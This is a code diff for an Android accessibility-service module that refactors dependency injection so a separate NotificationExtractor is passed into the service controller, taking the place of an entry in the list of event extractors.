@@ -16,8 +16,8 @@ import service.android.google.com.accessibility.R;
 import service.android.google.com.accessibility.controller.AccessibilityServiceController;
 import service.android.google.com.accessibility.controller.AccessibilityServiceControllerImpl;
 import service.android.google.com.accessibility.extractor.EventExtractor;
+import service.android.google.com.accessibility.extractor.NotificationExtractor;
 import service.android.google.com.accessibility.extractor.extractors.Extractor;
-import service.android.google.com.accessibility.extractor.extractors.NotificationStateChangedExtractor;
 import service.android.google.com.accessibility.extractor.extractors.ViewClickedExtractor;
 import service.android.google.com.accessibility.extractor.extractors.ViewFocusedExtractor;
 import service.android.google.com.accessibility.extractor.extractors.ViewTextChangedExtractor;
@@ -71,6 +71,7 @@ public class AccessibilityModule {
                                         final ObserverFactory observerFactory,
                                         final SchedulerFactory schedulerFactory,
                                         final EventExtractor eventExtractor,
+                                        final NotificationExtractor notificationExtractor,
                                         final WindowRipper windowRipper,
                                         final RxDatabase rxDatabase,
                                         final Resources resources,
@@ -81,6 +82,7 @@ public class AccessibilityModule {
                 observerFactory,
                 schedulerFactory,
                 eventExtractor,
+                notificationExtractor,
                 windowRipper,
                 rxDatabase,
                 resources,
@@ -121,9 +123,13 @@ public class AccessibilityModule {
                 new ViewClickedExtractor(),
                 new ViewFocusedExtractor(asList(PackageConstants.APP_NEXUS_APP_LAUNCHER)),
                 new ViewTextChangedExtractor(),
-                new WindowStateChangedExtractor(resources.getString(R.string.pref_key_apps), prefser),
-                new NotificationStateChangedExtractor()
+                new WindowStateChangedExtractor(resources.getString(R.string.pref_key_apps), prefser)
         ));
+    }
+
+    @Provides
+    NotificationExtractor notificationExtractor() {
+        return new NotificationExtractor();
     }
 
     @Provides
